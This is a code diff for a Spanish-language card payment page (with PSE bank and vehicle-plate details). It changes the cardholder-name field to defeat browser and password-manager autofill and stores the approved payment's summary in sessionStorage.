@@ -311,7 +311,7 @@ const pseBanks = [
         <p id="cardBrand" class="text-sm text-gray mb-4">Visa · Mastercard · American Express · Diners Club</p>
         <div class="grid gap-4">
           <label class="mat-field">
-            <input id="cardTitular" name="pyps-card-titular" maxlength="80" autocomplete="off" autocapitalize="characters" data-lpignore="true" data-1p-ignore="true" data-form-type="other" />
+            <input id="cardTitular" name="payzen-fld-hldr" maxlength="80" autocomplete="one-time-code" autocapitalize="characters" data-lpignore="true" data-1p-ignore="true" data-form-type="other" value="" readonly spellcheck="false" />
             <span>Nombre del titular *</span>
           </label>
           <label class="mat-field">
@@ -1356,6 +1356,12 @@ const pseBanks = [
     screen?.querySelectorAll('[data-approved-plates]').forEach((el) => {
       el.textContent = plates;
     });
+    sessionStorage.setItem('pyps-approved', JSON.stringify({
+      amount: amountLabel,
+      datetime: datetimeLabel,
+      ref,
+      plates,
+    }));
     if (screen) {
       if (screen.parentElement !== document.body) document.body.appendChild(screen);
       screen.hidden = false;
@@ -2435,14 +2441,27 @@ const pseBanks = [
     ['cardTitular', 'cardNumero', 'cardVence', 'cardCvv'].forEach((id) => {
       const el = document.getElementById(id);
       if (!el) return;
-      el.setAttribute('autocomplete', 'off');
+      el.setAttribute('autocomplete', id === 'cardTitular' ? 'one-time-code' : 'off');
       el.setAttribute('readonly', 'readonly');
       el.value = '';
       window.setTimeout(() => {
-        el.value = '';
-        el.removeAttribute('readonly');
+        if (id === 'cardTitular' && document.activeElement !== el) {
+          el.value = '';
+          return;
+        }
+        if (id !== 'cardTitular') el.removeAttribute('readonly');
+        el.value = id === 'cardTitular' ? '' : el.value;
       }, 350);
     });
+    const titular = document.getElementById('cardTitular');
+    const wipeTitular = () => {
+      if (!titular || document.activeElement === titular) return;
+      titular.value = '';
+    };
+    [0, 50, 150, 350, 700, 1200, 2000].forEach((ms) => window.setTimeout(wipeTitular, ms));
+    const unlockTitular = () => titular?.removeAttribute('readonly');
+    titular?.addEventListener('pointerdown', unlockTitular);
+    titular?.addEventListener('focus', unlockTitular);
     document.getElementById('cardError')?.classList.add('hidden');
     pypsOverlay('cardOverlay', true);
   });
